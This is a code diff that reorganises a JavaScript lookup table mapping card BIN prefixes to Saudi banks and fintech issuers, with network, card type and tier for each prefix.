+        '232520': { bank: 'الرياض', network: 'Mastercard', type: 'Credit', tier: 'World' },
+        '401560': { bank: 'الرياض', network: 'Visa', type: 'Credit', tier: 'Platinum' },
+        '406471': { bank: 'الرياض', network: 'Visa', type: 'Debit', tier: 'Prepaid Purchasing' },
+        '416041': { bank: 'الرياض', network: 'Visa', type: 'Debit', tier: 'Prepaid Platinum' },
+        '416042': { bank: 'الرياض', network: 'Visa', type: 'Credit', tier: 'Signature' },
+        '428973': { bank: 'الرياض', network: 'Visa', type: 'Credit', tier: 'Infinite' },
+        '435700': { bank: 'الرياض', network: 'Visa', type: 'Debit', tier: 'Prepaid Platinum' },
+        '448509': { bank: 'الرياض', network: 'Visa', type: 'Credit', tier: 'Purchasing' },
+        '451475': { bank: 'الرياض', network: 'Visa', type: 'Credit', tier: 'Signature' },
+        '454683': { bank: 'الرياض', network: 'Visa', type: 'Credit', tier: 'Platinum' },
+        '454684': { bank: 'الرياض', network: 'Visa', type: 'Credit', tier: 'Classic' },
+        '457927': { bank: 'الرياض', network: 'Visa', type: 'Debit', tier: 'Prepaid Classic' },
+        '465961': { bank: 'الرياض', network: 'Visa', type: 'Credit', tier: 'Signature' },
+        '477983': { bank: 'الرياض', network: 'Visa', type: 'Credit', tier: 'Infinite' },
+        '479090': { bank: 'الرياض', network: 'Visa', type: 'Credit', tier: 'Platinum' },
+        '513213': { bank: 'الرياض', network: 'mada', type: 'Debit', tier: 'Prepaid' },
+        '513502': { bank: 'الرياض', network: 'Mastercard', type: 'Credit', tier: 'World Business' },
+        '514932': { bank: 'الرياض', network: 'Mastercard', type: 'Credit', tier: 'Platinum' },
+        '515750': { bank: 'الرياض', network: 'Mastercard', type: 'Credit', tier: 'Corporate' },
+        '517531': { bank: 'الرياض', network: 'Mastercard', type: 'Credit', tier: 'Titanium' },
+        '520058': { bank: 'الرياض', network: 'mada', type: 'Debit', tier: 'Business' },
+        '520089': { bank: 'الرياض', network: 'Mastercard', type: 'Credit', tier: 'Business' },
+        '520090': { bank: 'الرياض', network: 'Mastercard', type: 'Credit', tier: 'Platinum' },
+        '524514': { bank: 'الرياض', network: 'mada', type: 'Debit', tier: 'Platinum' },
+        '526084': { bank: 'الرياض', network: 'Mastercard', type: 'Credit', tier: 'Platinum' },
+        '527016': { bank: 'الرياض', network: 'Mastercard', type: 'Credit', tier: 'World Business' },
+        '527023': { bank: 'الرياض', network: 'Mastercard', type: 'Credit', tier: 'Standard' },
+        '529271': { bank: 'الرياض', network: 'Mastercard', type: 'Debit', tier: 'Prepaid' },
+        '529741': { bank: 'الرياض', network: 'mada', type: 'Debit', tier: 'Standard' },
+        '533940': { bank: 'الرياض', network: 'Mastercard', type: 'Credit', tier: 'World' },
+        '535989': { bank: 'الرياض', network: 'mada', type: 'Debit', tier: 'World' },
+        '536023': { bank: 'الرياض', network: 'mada', type: 'Debit', tier: 'World' },
+        '537678': { bank: 'الرياض', network: 'Mastercard', type: 'Credit', tier: 'World Business' },
+        '537767': { bank: 'الرياض', network: 'mada', type: 'Debit', tier: 'Titanium' },
+        '539859': { bank: 'الرياض', network: 'Mastercard', type: 'Credit', tier: 'Platinum' },
+        '541679': { bank: 'الرياض', network: 'Mastercard', type: 'Credit', tier: 'Standard' },
+        '541802': { bank: 'الرياض', network: 'Mastercard', type: 'Credit', tier: 'World' },
+        '541988': { bank: 'الرياض', network: 'Mastercard', type: 'Credit', tier: 'Gold' },
+        '545855': { bank: 'الرياض', network: 'Mastercard', type: 'Credit', tier: 'Standard' },
+        '546319': { bank: 'الرياض', network: 'Mastercard', type: 'Debit', tier: 'Standard' },
+        '547657': { bank: 'الرياض', network: 'Mastercard', type: 'Debit', tier: 'Prepaid' },
+        '548322': { bank: 'الرياض', network: 'Mastercard', type: 'Credit', tier: 'Standard' },
+        '548323': { bank: 'الرياض', network: 'Mastercard', type: 'Credit', tier: 'Gold' },
+        '558563': { bank: 'الرياض', network: 'mada', type: 'Debit', tier: 'Prepaid' },
+        '558823': { bank: 'الرياض', network: 'Mastercard', type: 'Debit', tier: 'Prepaid' },
+        '559322': { bank: 'الرياض', network: 'Mastercard', type: 'Credit', tier: 'World Elite' },
+        '588849': { bank: 'الرياض', network: 'Maestro', type: 'Debit', tier: 'Standard' },
+        '968209': { bank: 'الرياض', network: 'Mada', type: 'Debit', tier: 'Mada' },
+
+        // ===== بنك البلاد =====
+        '400795': { bank: 'البلاد', network: 'Visa', type: 'Credit', tier: 'Signature Business' },
+        '401778': { bank: 'البلاد', network: 'Visa', type: 'Debit', tier: 'Classic' },
+        '402667': { bank: 'البلاد', network: 'Visa', type: 'Credit', tier: 'Signature' },
+        '403872': { bank: 'البلاد', network: 'Visa', type: 'Debit', tier: 'Prepaid Classic' },
+        '403991': { bank: 'البلاد', network: 'Visa', type: 'Credit', tier: 'Platinum' },
+        '403996': { bank: 'البلاد', network: 'Visa', type: 'Credit', tier: 'Signature' },
+        '407989': { bank: 'البلاد', network: 'Visa', type: 'Debit', tier: 'Prepaid Classic' },
+        '417633': { bank: 'البلاد', network: 'mada', type: 'Debit', tier: 'Electron' },
+        '423254': { bank: 'البلاد', network: 'Visa', type: 'Debit', tier: 'Prepaid Classic' },
+        '424260': { bank: 'البلاد', network: 'Visa', type: 'Credit', tier: 'Rewards' },
+        '424261': { bank: 'البلاد', network: 'Visa', type: 'Credit', tier: 'Gold' },
+        '424262': { bank: 'البلاد', network: 'Visa', type: 'Credit', tier: 'Platinum' },
+        '428334': { bank: 'البلاد', network: 'Visa', type: 'Debit', tier: 'Prepaid Classic' },
+        '428335': { bank: 'البلاد', network: 'Visa', type: 'Debit', tier: 'Prepaid Platinum' },
+        '433072': { bank: 'البلاد', network: 'Visa', type: 'Debit', tier: 'Prepaid Classic' },
+        '433457': { bank: 'البلاد', network: 'Visa', type: 'Credit', tier: 'Ultra High Net Worth' },
+        '433952': { bank: 'البلاد', network: 'Visa', type: 'Debit', tier: 'Prepaid Classic' },
+        '443946': { bank: 'البلاد', network: 'Visa', type: 'Debit', tier: 'Prepaid Platinum' },
+        '445687': { bank: 'البلاد', network: 'Visa', type: 'Debit', tier: 'Prepaid Platinum' },
+        '446392': { bank: 'البلاد', network: 'Visa', type: 'Credit', tier: 'Signature' },
+        '446393': { bank: 'البلاد', network: 'mada', type: 'Debit', tier: 'Signature' },
+        '446422': { bank: 'البلاد', network: 'Visa', type: 'Credit', tier: 'Signature' },
+        '457795': { bank: 'البلاد', network: 'Visa', type: 'Debit', tier: 'Prepaid Corporate' },
+        '457796': { bank: 'البلاد', network: 'Visa', type: 'Credit', tier: 'Infinite' },
+        '468540': { bank: 'البلاد', network: 'mada', type: 'Debit', tier: 'Classic' },
+        '468541': { bank: 'البلاد', network: 'mada', type: 'Debit', tier: 'Classic' },
+        '468542': { bank: 'البلاد', network: 'mada', type: 'Debit', tier: 'Infinite' },
+        '468543': { bank: 'البلاد', network: 'mada', type: 'Debit', tier: 'Platinum' },
+        '475078': { bank: 'البلاد', network: 'Visa', type: 'Credit', tier: 'Business Enhanced' },
+        '475100': { bank: 'البلاد', network: 'Visa', type: 'Credit', tier: 'Signature Business' },
+        '475109': { bank: 'البلاد', network: 'Visa', type: 'Credit', tier: 'Purchasing' },
+        '475153': { bank: 'البلاد', network: 'Visa', type: 'Credit', tier: 'Business Enhanced' },
+        '481206': { bank: 'البلاد', network: 'Visa', type: 'Credit', tier: 'Platinum' },
+        '481207': { bank: 'البلاد', network: 'Visa', type: 'Credit', tier: 'Classic' },
+        '490745': { bank: 'البلاد', network: 'Visa', type: 'Debit', tier: 'Prepaid Classic' },
+        '636120': { bank: 'البلاد', network: 'Mada', type: 'Debit', tier: 'Standard' },
+        '968201': { bank: 'البلاد', network: 'Mada', type: 'Debit', tier: 'Mada' },
+
+        // ===== البنك السعودي الفرنسي =====
+        '401812': { bank: 'الفرنسي', network: 'Visa', type: 'Credit', tier: 'Platinum' },
+        '401883': { bank: 'الفرنسي', network: 'Visa', type: 'Credit', tier: 'Signature' },
+        '401884': { bank: 'الفرنسي', network: 'Visa', type: 'Credit', tier: 'Infinite' },
+        '401978': { bank: 'الفرنسي', network: 'Visa', type: 'Debit', tier: 'Prepaid Classic' },
+        '404278': { bank: 'الفرنسي', network: 'Visa', type: 'Credit', tier: 'Signature Business' },
+        '404861': { bank: 'الفرنسي', network: 'Visa', type: 'Credit', tier: 'Business Enhanced' },
+        '405057': { bank: 'الفرنسي', network: 'Visa', type: 'Credit', tier: 'Infinite' },
+        '407392': { bank: 'الفرنسي', network: 'Visa', type: 'Debit', tier: 'Business' },
+        '407415': { bank: 'الفرنسي', network: 'Visa', type: 'Credit', tier: 'Business Enhanced' },
+        '421141': { bank: 'الفرنسي', network: 'mada', type: 'Debit', tier: 'Infinite' },
+        '425871': { bank: 'الفرنسي', network: 'Visa', type: 'Credit', tier: 'Platinum' },
+        '428275': { bank: 'الفرنسي', network: 'Visa', type: 'Credit', tier: 'Rewards' },
+        '437974': { bank: 'الفرنسي', network: 'Visa', type: 'Credit', tier: 'Platinum' },
+        '437975': { bank: 'الفرنسي', network: 'Visa', type: 'Credit', tier: 'Infinite' },
+        '437976': { bank: 'الفرنسي', network: 'Visa', type: 'Credit', tier: 'Signature' },
+        '437977': { bank: 'الفرنسي', network: 'Visa', type: 'Credit', tier: 'Signature' },
+        '437978': { bank: 'الفرنسي', network: 'Visa', type: 'Credit', tier: 'Ultra High Net Worth' },
+        '437979': { bank: 'الفرنسي', network: 'Visa', type: 'Credit', tier: 'Signature' },
+        '440647': { bank: 'الفرنسي', network: 'mada', type: 'Debit', tier: 'Classic' },
+        '440795': { bank: 'الفرنسي', network: 'mada', type: 'Debit', tier: 'Business' },
+        '444445': { bank: 'الفرنسي', network: 'Visa', type: 'Debit', tier: 'Prepaid Platinum' },
+        '446404': { bank: 'الفرنسي', network: 'mada', type: 'Debit', tier: 'Infinite' },
+        '454669': { bank: 'الفرنسي', network: 'Visa', type: 'Credit', tier: 'Business Enhanced' },
+        '457865': { bank: 'الفرنسي', network: 'mada', type: 'Debit', tier: 'Platinum' },
+        '457997': { bank: 'الفرنسي', network: 'mada', type: 'Debit', tier: 'Classic' },
+        '459583': { bank: 'الفرنسي', network: 'Visa', type: 'Credit', tier: 'Signature' },
+        '459588': { bank: 'الفرنسي', network: 'Visa', type: 'Credit', tier: 'Infinite' },
+        '459800': { bank: 'الفرنسي', network: 'Visa', type: 'Credit', tier: 'Platinum' },
+        '463869': { bank: 'الفرنسي', network: 'Visa', type: 'Debit', tier: 'Infinite' },
+        '473899': { bank: 'الفرنسي', network: 'Visa', type: 'Credit', tier: 'Platinum' },
+        '474491': { bank: 'الفرنسي', network: 'mada', type: 'Debit', tier: 'Prepaid Classic' },
+        '474827': { bank: 'الفرنسي', network: 'Visa', type: 'Debit', tier: 'Prepaid Platinum' },
+        '475558': { bank: 'الفرنسي', network: 'Visa', type: 'Credit', tier: 'Signature' },
+        '496655': { bank: 'الفرنسي', network: 'Visa', type: 'Credit', tier: 'Rewards' },
+        '512691': { bank: 'الفرنسي', network: 'Mastercard', type: 'Credit', tier: 'Business' },
+        '512727': { bank: 'الفرنسي', network: 'Mastercard', type: 'Credit', tier: 'World Elite' },
+        '517724': { bank: 'الفرنسي', network: 'Mastercard', type: 'Credit', tier: 'Standard' },
+        '523615': { bank: 'الفرنسي', network: 'Mastercard', type: 'Credit', tier: 'Titanium' },
+        '523956': { bank: 'الفرنسي', network: 'Mastercard', type: 'Credit', tier: 'Titanium' },
+        '524148': { bank: 'الفرنسي', network: 'Mastercard', type: 'Credit', tier: 'Platinum' },
+        '538135': { bank: 'الفرنسي', network: 'Mastercard', type: 'Credit', tier: 'Platinum' },
+        '542747': { bank: 'الفرنسي', network: 'Mastercard', type: 'Credit', tier: 'Platinum' },
+        '547042': { bank: 'الفرنسي', network: 'Mastercard', type: 'Credit', tier: 'Platinum' },
+        '552012': { bank: 'الفرنسي', network: 'Mastercard', type: 'Credit', tier: 'Platinum' },
+        '552360': { bank: 'الفرنسي', network: 'Mastercard', type: 'Credit', tier: 'World' },
+        '552444': { bank: 'الفرنسي', network: 'Mastercard', type: 'Credit', tier: 'World Elite' },
+        '555078': { bank: 'الفرنسي', network: 'Mastercard', type: 'Credit', tier: 'World Elite' },
+        '588845': { bank: 'الفرنسي', network: 'Mada', type: 'Debit', tier: 'Standard' },
+        '968208': { bank: 'الفرنسي', network: 'Mada', type: 'Debit', tier: 'Mada' },
+
+        // ===== البنك العربي الوطني =====
+        '404949': { bank: 'العربي', network: 'Visa', type: 'Credit', tier: 'Classic' },
+        '405145': { bank: 'العربي', network: 'Visa', type: 'Credit', tier: 'Ultra High Net Worth' },
+        '406485': { bank: 'العربي', network: 'Visa', type: 'Debit', tier: 'Prepaid Select' },
+        '417346': { bank: 'العربي', network: 'Visa', type: 'Credit', tier: 'Rewards' },
+        '417347': { bank: 'العربي', network: 'Visa', type: 'Credit', tier: 'Platinum' },
+        '418764': { bank: 'العربي', network: 'Visa', type: 'Credit', tier: 'Signature Business' },
+        '420177': { bank: 'العربي', network: 'Visa', type: 'Credit', tier: 'Signature' },
+        '422862': { bank: 'العربي', network: 'Visa', type: 'Credit', tier: 'Classic' },
+        '435240': { bank: 'العربي', network: 'Visa', type: 'Credit', tier: 'Platinum' },
+        '438772': { bank: 'العربي', network: 'Visa', type: 'Credit', tier: 'Signature' },
+        '439370': { bank: 'العربي', network: 'Visa', type: 'Debit', tier: 'Prepaid Platinum' },
+        '455017': { bank: 'العربي', network: 'Visa', type: 'Debit', tier: 'Prepaid Platinum' },
+        '455020': { bank: 'العربي', network: 'Visa', type: 'Debit', tier: 'Prepaid Platinum' },
+        '455035': { bank: 'العربي', network: 'Visa', type: 'Credit', tier: 'Gold' },
+        '455036': { bank: 'العربي', network: 'mada', type: 'Debit', tier: 'Classic' },
+        '455037': { bank: 'العربي', network: 'Visa', type: 'Credit', tier: 'Rewards' },
+        '455310': { bank: 'العربي', network: 'Visa', type: 'Credit', tier: 'Rewards' },
+        '455422': { bank: 'العربي', network: 'Visa', type: 'Credit', tier: 'Signature' },
+        '455423': { bank: 'العربي', network: 'Visa', type: 'Credit', tier: 'Infinite' },
+        '476328': { bank: 'العربي', network: 'Visa', type: 'Credit', tier: 'Infinite' },
+        '524646': { bank: 'العربي', network: 'Mastercard', type: 'Credit', tier: 'Platinum' },
+        '524940': { bank: 'العربي', network: 'mada', type: 'Debit', tier: 'Prepaid' },
+        '530792': { bank: 'العربي', network: 'Mastercard', type: 'Credit', tier: 'World' },
+        '534480': { bank: 'العربي', network: 'Mastercard', type: 'Debit', tier: 'Prepaid World' },
+        '538776': { bank: 'العربي', network: 'Mastercard', type: 'Credit', tier: 'Business' },
+        '549400': { bank: 'العربي', network: 'Mastercard', type: 'Credit', tier: 'Standard' },
+
+        // ===== بنك الجزيرة =====
+        '401758': { bank: 'الجزيرة', network: 'Visa', type: 'Debit', tier: 'Prepaid Platinum' },
+        '402527': { bank: 'الجزيرة', network: 'Visa', type: 'Credit', tier: 'Business' },
+        '402804': { bank: 'الجزيرة', network: 'Visa', type: 'Credit', tier: 'Business' },
+        '406487': { bank: 'الجزيرة', network: 'Visa', type: 'Debit', tier: 'Prepaid Classic' },
+        '411092': { bank: 'الجزيرة', network: 'Visa', type: 'Credit', tier: 'Rewards' },
+        '414090': { bank: 'الجزيرة', network: 'Visa', type: 'Credit', tier: 'Gold' },
+        '414841': { bank: 'الجزيرة', network: 'Visa', type: 'Credit', tier: 'Ultra High Net Worth' },
+        '421051': { bank: 'الجزيرة', network: 'Visa', type: 'Credit', tier: 'Classic' },
+        '428374': { bank: 'الجزيرة', network: 'Visa', type: 'Credit', tier: 'Rewards' },
+        '428375': { bank: 'الجزيرة', network: 'Visa', type: 'Credit', tier: 'Platinum' },
+        '440532': { bank: 'الجزيرة', network: 'Visa', type: 'Credit', tier: 'Platinum' },
+        '440533': { bank: 'الجزيرة', network: 'mada', type: 'Debit', tier: 'Classic' },
+        '444495': { bank: 'الجزيرة', network: 'Visa', type: 'Debit', tier: 'Platinum' },
+        '444496': { bank: 'الجزيرة', network: 'Visa', type: 'Debit', tier: 'Platinum' },
+        '445564': { bank: 'الجزيرة', network: 'mada', type: 'Debit', tier: 'Infinite' },
+        '446914': { bank: 'الجزيرة', network: 'Visa', type: 'Credit', tier: 'Platinum' },
+        '454097': { bank: 'الجزيرة', network: 'Visa', type: 'Debit', tier: 'Business' },
+        '473825': { bank: 'الجزيرة', network: 'Visa', type: 'Credit', tier: 'Platinum' },
+        '473826': { bank: 'الجزيرة', network: 'Visa', type: 'Credit', tier: 'Platinum' },
+        '473827': { bank: 'الجزيرة', network: 'Visa', type: 'Credit', tier: 'Infinite' },
+        '473828': { bank: 'الجزيرة', network: 'Visa', type: 'Credit', tier: 'Signature' },
+        '489317': { bank: 'الجزيرة', network: 'Visa', type: 'Credit', tier: 'Signature Business' },
+        '489318': { bank: 'الجزيرة', network: 'mada', type: 'Debit', tier: 'Rewards' },
+        '489319': { bank: 'الجزيرة', network: 'mada', type: 'Debit', tier: 'Platinum' },
+        '489447': { bank: 'الجزيرة', network: 'Visa', type: 'Debit', tier: 'Prepaid Classic' },
+        '504300': { bank: 'الجزيرة', network: 'Maestro', type: 'Debit', tier: 'Standard' },
+        '511249': { bank: 'الجزيرة', network: 'Mastercard', type: 'Credit', tier: 'Gold' },
+        '523041': { bank: 'الجزيرة', network: 'Mastercard', type: 'Credit', tier: 'Standard' },
+        '524236': { bank: 'الجزيرة', network: 'Mastercard', type: 'Credit', tier: 'Platinum' },
+        '546924': { bank: 'الجزيرة', network: 'Mastercard', type: 'Credit', tier: 'World Elite' },
+        '550002': { bank: 'الجزيرة', network: 'Mastercard', type: 'Credit', tier: 'Titanium' },
+        '968211': { bank: 'الجزيرة', network: 'Mada', type: 'Debit', tier: 'Mada' },
+
+        // ===== البنك السعودي للاستثمار =====
+        '415950': { bank: 'الاستثمار', network: 'Visa', type: 'Debit', tier: 'Classic' },
+        '440629': { bank: 'الاستثمار', network: 'Visa', type: 'Credit', tier: 'Classic' },
+        '440630': { bank: 'الاستثمار', network: 'Visa', type: 'Debit', tier: 'Electron' },
+        '440631': { bank: 'الاستثمار', network: 'Visa', type: 'Credit', tier: 'Gold' },
+        '457840': { bank: 'الاستثمار', network: 'Visa', type: 'Credit', tier: 'Platinum' },
+        '457841': { bank: 'الاستثمار', network: 'Visa', type: 'Credit', tier: 'Platinum' },
+        '469616': { bank: 'الاستثمار', network: 'Visa', type: 'Credit', tier: 'Classic' },
+        '476815': { bank: 'الاستثمار', network: 'Visa', type: 'Credit', tier: 'Signature' },
+        '478295': { bank: 'الاستثمار', network: 'Visa', type: 'Debit', tier: 'Prepaid Platinum' },
+        '478296': { bank: 'الاستثمار', network: 'Visa', type: 'Debit', tier: 'Prepaid Platinum' },
+        '483010': { bank: 'الاستثمار', network: 'mada', type: 'Debit', tier: 'Classic' },
+        '483011': { bank: 'الاستثمار', network: 'mada', type: 'Debit', tier: 'Platinum' },
+        '483012': { bank: 'الاستثمار', network: 'mada', type: 'Debit', tier: 'Infinite' },
+        '524205': { bank: 'الاستثمار', network: 'Mastercard', type: 'Credit', tier: 'Platinum' },
+        '529298': { bank: 'الاستثمار', network: 'Mastercard', type: 'Credit', tier: 'Platinum' },
+        '542373': { bank: 'الاستثمار', network: 'Mastercard', type: 'Credit', tier: 'Platinum' },
+        '552384': { bank: 'الاستثمار', network: 'Mastercard', type: 'Credit', tier: 'World' },
+        '556579': { bank: 'الاستثمار', network: 'Mastercard', type: 'Credit', tier: 'Gold' },
+        '589206': { bank: 'الاستثمار', network: 'Maestro', type: 'Debit', tier: 'Standard' },
+        '968207': { bank: 'الاستثمار', network: 'Mada', type: 'Debit', tier: 'Mada' },
+
+        // ===== البنك السعودي البريطاني (ساب) =====
+        '414478': { bank: 'ساب', network: 'Visa', type: 'Credit', tier: 'Classic' },
+        '455058': { bank: 'ساب', network: 'Visa', type: 'Credit', tier: 'Gold' },
+        '455340': { bank: 'ساب', network: 'Visa', type: 'Credit', tier: 'Classic' },
+        '455389': { bank: 'ساب', network: 'Visa', type: 'Credit', tier: 'Classic' },
+        '536581': { bank: 'ساب', network: 'Mastercard', type: 'Debit', tier: 'Prepaid Business' },
+        '541653': { bank: 'ساب', network: 'Mastercard', type: 'Credit', tier: 'Standard' },
+        '545297': { bank: 'ساب', network: 'Mastercard', type: 'Credit', tier: 'Standard' },
+        '548979': { bank: 'ساب', network: 'Mastercard', type: 'Credit', tier: 'Standard' },
+        '552953': { bank: 'ساب', network: 'Mastercard', type: 'Credit', tier: 'Business' },
+        '605141': { bank: 'ساب', network: 'Mada', type: 'Debit', tier: 'Standard' },
+        '968204': { bank: 'ساب', network: 'Mada', type: 'Debit', tier: 'Mada' },
+
+        // ===== البنك الأول =====
+        '512060': { bank: 'الأول', network: 'Mastercard', type: 'Credit', tier: 'World' },
+        '522139': { bank: 'الأول', network: 'Mastercard', type: 'Credit', tier: 'Standard' },
+        '524165': { bank: 'الأول', network: 'Mastercard', type: 'Credit', tier: 'Titanium' },
+        '530843': { bank: 'الأول', network: 'Mastercard', type: 'Credit', tier: 'Platinum' },
+        '533172': { bank: 'الأول', network: 'Mastercard', type: 'Credit', tier: 'Corporate' },
+        '539931': { bank: 'الأول', network: 'Mastercard', type: 'Debit', tier: 'Standard' },
+        '540236': { bank: 'الأول', network: 'Mastercard', type: 'Credit', tier: 'Platinum' },
+        '542008': { bank: 'الأول', network: 'Mastercard', type: 'Credit', tier: 'Titanium' },
+        '543199': { bank: 'الأول', network: 'Mastercard', type: 'Credit', tier: 'Platinum' },
+        '543408': { bank: 'الأول', network: 'Mastercard', type: 'Credit', tier: 'Platinum' },
         '546755': { bank: 'الأول', network: 'Mastercard', type: 'Credit', tier: 'World' },
         '546756': { bank: 'الأول', network: 'Mastercard', type: 'Credit', tier: 'World Elite Flex' },
         '546757': { bank: 'الأول', network: 'Mastercard', type: 'Credit', tier: 'Platinum' },
-        '546924': { bank: 'الجزيرة', network: 'Mastercard', type: 'Credit', tier: 'World Elite' },
-        '547026': { bank: 'الإنماء', network: 'Mastercard', type: 'Credit', tier: 'World Elite' },
-        '547042': { bank: 'الفرنسي', network: 'Mastercard', type: 'Credit', tier: 'Platinum' },
         '547645': { bank: 'الأول', network: 'Mastercard', type: 'Credit', tier: 'Executive Business' },
-        '548255': { bank: 'الأهلي', network: 'Mastercard', type: 'Credit', tier: 'Gold' },
-        '548322': { bank: 'الرياض', network: 'Mastercard', type: 'Credit', tier: 'Standard' },
-        '548323': { bank: 'الرياض', network: 'Mastercard', type: 'Credit', tier: 'Gold' },
         '548349': { bank: 'الأول', network: 'Mastercard', type: 'Credit', tier: 'Standard' },
         '548350': { bank: 'الأول', network: 'Mastercard', type: 'Credit', tier: 'Titanium' },
-        '548979': { bank: 'الأول', network: 'Mastercard', type: 'Credit', tier: 'Standard' },
-        '549400': { bank: 'الأهلي', network: 'Mastercard', type: 'Credit', tier: 'Standard' },
-        '549699': { bank: 'الأهلي', network: 'Mastercard', type: 'Credit', tier: 'World Elite' },
-        '549760': { bank: 'الأهلي', network: 'Mastercard', type: 'Debit', tier: 'Prepaid' },
         '549799': { bank: 'الأول', network: 'Mastercard', type: 'Credit', tier: 'World Elite' },
-        '549954': { bank: 'الأهلي', network: 'Mastercard', type: 'Credit', tier: 'Standard' },
-        '549963': { bank: 'الراجحي', network: 'Mastercard', type: 'Credit', tier: 'Titanium' },
-        '549964': { bank: 'الراجحي', network: 'Mastercard', type: 'Credit', tier: 'Titanium' },
-        '550002': { bank: 'الجزيرة', network: 'Mastercard', type: 'Credit', tier: 'Titanium' },
-        '552012': { bank: 'الفرنسي', network: 'Mastercard', type: 'Credit', tier: 'Platinum' },
-        '552075': { bank: 'الأهلي', network: 'Mastercard', type: 'Credit', tier: 'Platinum' },
-        '552077': { bank: 'الأهلي', network: 'Mastercard', type: 'Credit', tier: 'World Elite' },
-        '552360': { bank: 'الفرنسي', network: 'Mastercard', type: 'Credit', tier: 'World' },
-        '552363': { bank: 'الإنماء', network: 'Mastercard', type: 'Credit', tier: 'World' },
         '552375': { bank: 'الأول', network: 'Mastercard', type: 'Credit', tier: 'World' },
-        '552384': { bank: 'الاستثمار', network: 'Mastercard', type: 'Credit', tier: 'World' },
         '552438': { bank: 'الأول', network: 'Mastercard', type: 'Credit', tier: 'World' },
-        '554180': { bank: 'الأهلي', network: 'Mastercard', type: 'Debit', tier: 'World Elite' },
-        '554575': { bank: 'الراجحي', network: 'Mastercard', type: 'Credit', tier: 'Platinum' },
-        '556675': { bank: 'الأهلي', network: 'Mastercard', type: 'Credit', tier: 'Corporate World' },
-        '556676': { bank: 'الأهلي', network: 'Mastercard', type: 'Credit', tier: 'Corporate' },
         '557606': { bank: 'الأول', network: 'Mastercard', type: 'Debit', tier: 'Titanium' },
-        '558563': { bank: 'الرياض', network: 'Mastercard', type: 'Debit', tier: 'Prepaid' },
         '558848': { bank: 'الأول', network: 'Mastercard', type: 'Debit', tier: 'Platinum' },
         '558854': { bank: 'الأول', network: 'Mastercard', type: 'Credit', tier: 'Executive Business' },
-        '559322': { bank: 'الرياض', network: 'Mastercard', type: 'Credit', tier: 'World Elite' },
-        '588845': { bank: 'الفرنسي', network: 'Mada', type: 'Debit', tier: 'Standard' },
         '588846': { bank: 'الأول', network: 'Maestro', type: 'Debit', tier: 'Standard' },
-        '588848': { bank: 'الأهلي', network: 'Maestro', type: 'Debit', tier: 'Standard' },
-        '588850': { bank: 'الأهلي', network: 'Maestro', type: 'Debit', tier: 'Personal' },
-        '589206': { bank: 'الاستثمار', network: 'Maestro', type: 'Debit', tier: 'Standard' },
-        '604906': { bank: 'الأهلي', network: 'Maestro', type: 'Debit', tier: 'Standard' },
-        '605141': { bank: 'البريطاني', network: 'Mada', type: 'Debit', tier: 'Standard' },
-        '636120': { bank: 'البلاد', network: 'Mada', type: 'Debit', tier: 'Standard' },
-        '968201': { bank: 'البلاد', network: 'Mada', type: 'Debit', tier: 'Mada' },
-        '968202': { bank: 'الأهلي', network: 'Mada', type: 'Debit', tier: 'Mada' },
-        '968203': { bank: 'الأهلي', network: 'Mada', type: 'Debit', tier: 'Mada' },
-        '968204': { bank: 'البريطاني', network: 'Mada', type: 'Debit', tier: 'Mada' },
-        '968205': { bank: 'الراجحي', network: 'Mada', type: 'Debit', tier: 'Mada' },
-        '968206': { bank: 'الإنماء', network: 'Mada', type: 'Debit', tier: 'Mada' },
-        '968207': { bank: 'الاستثمار', network: 'Mada', type: 'Debit', tier: 'Mada' },
-        '968208': { bank: 'الفرنسي', network: 'Mada', type: 'Debit', tier: 'Mada' },
-        '968209': { bank: 'الرياض', network: 'Mada', type: 'Debit', tier: 'Mada' },
-        '968211': { bank: 'الجزيرة', network: 'Mada', type: 'Debit', tier: 'Mada' },
+
+        // ===== STC Bank / STC Pay =====
+        '420132': { bank: 'STC Pay', network: 'mada', type: 'Debit', tier: 'Prepaid Classic' },
+        '441658': { bank: 'STC Pay', network: 'Visa', type: 'Credit', tier: 'Signature' },
+        '459047': { bank: 'STC Pay', network: 'Visa', type: 'Credit', tier: 'Business' },
+        '489022': { bank: 'STC Pay', network: 'Visa', type: 'Credit', tier: 'Rewards' },
+        '489671': { bank: 'STC Pay', network: 'Visa', type: 'Credit', tier: 'Business Enhanced' },
+        '489674': { bank: 'STC Pay', network: 'Visa', type: 'Credit', tier: 'Signature Business' },
+
+        // ===== D360 Bank =====
+        '428068': { bank: 'D360', network: 'Visa', type: 'Debit', tier: 'Classic' },
+        '431266': { bank: 'D360', network: 'Visa', type: 'Debit', tier: 'Signature' },
+        '435733': { bank: 'D360', network: 'Visa', type: 'Debit', tier: 'Infinite' },
+        '442463': { bank: 'D360', network: 'mada', type: 'Debit', tier: 'Classic' },
+
+        // ===== Tweeq =====
+        '223371': { bank: 'Tweeq', network: 'Mastercard', type: 'Debit', tier: 'Standard' },
+        '224020': { bank: 'Tweeq', network: 'Mastercard', type: 'Debit', tier: 'Standard' },
+        '242030': { bank: 'Tweeq', network: 'Mastercard', type: 'Debit', tier: 'Standard' },
+        '521661': { bank: 'Tweeq', network: 'Mastercard', type: 'Debit', tier: 'Standard' },
+        '532235': { bank: 'Tweeq', network: 'Mastercard', type: 'Credit', tier: 'Platinum' },
+        '541043': { bank: 'Tweeq', network: 'Mastercard', type: 'Credit', tier: 'Business' },
+
+        // ===== Urpay =====
+        '409735': { bank: 'Urpay', network: 'Visa', type: 'Credit', tier: 'Signature' },
+        '429004': { bank: 'Urpay', network: 'Visa', type: 'Credit', tier: 'Infinite' },
+        '429018': { bank: 'Urpay', network: 'Visa', type: 'Credit', tier: 'Signature' },
+        '450657': { bank: 'Urpay', network: 'Visa', type: 'Debit', tier: 'Prepaid Classic' },
+        '451111': { bank: 'Urpay', network: 'Visa', type: 'Debit', tier: 'Prepaid Classic' },
+        '487404': { bank: 'Urpay', network: 'Visa', type: 'Credit', tier: 'Business' },
+
+        // ===== محفظة برق (Barq) =====
+        '454887': { bank: 'برق', network: 'Visa', type: 'Credit', tier: 'Standard' },
+
+        // ===== نايفات للتمويل =====
+        '405913': { bank: 'نايفات', network: 'Visa', type: 'Credit', tier: 'Business Enhanced' },
+        '478774': { bank: 'نايفات', network: 'Visa', type: 'Credit', tier: 'Classic' },
+
+        // ===== بنك الخليج الدولي =====
+        '517597': { bank: 'الخليج الدولي', network: 'Mastercard', type: 'Credit', tier: 'Corporate' },
+        '521657': { bank: 'الخليج الدولي', network: 'Mastercard', type: 'Credit', tier: 'Corporate World' },
+        '539737': { bank: 'الخليج الدولي', network: 'Mastercard', type: 'Credit', tier: 'Corporate' },
